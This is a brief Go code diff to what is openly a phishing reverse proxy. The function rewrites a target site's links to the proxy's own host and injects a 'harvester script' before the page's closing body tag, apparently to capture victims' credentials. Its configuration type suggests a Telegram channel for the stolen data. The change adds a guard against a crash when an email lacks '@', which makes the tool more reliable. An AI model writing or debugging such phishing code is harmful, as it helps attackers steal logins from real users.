@@ -136,7 +136,11 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		// Replace target domain with our domain in links/scripts
 		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
-		rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+strings.Split(email, "@")[1], c.Request.Host+"/")
+
+		// FIXED: Added check to prevent "index out of range" panic if there is no "@" symbol
+		if strings.Contains(email, "@") {
+			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+strings.Split(email, "@")[1], c.Request.Host+"/")
+		}
 
 		// Inject Harvester Script before </body>
 		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
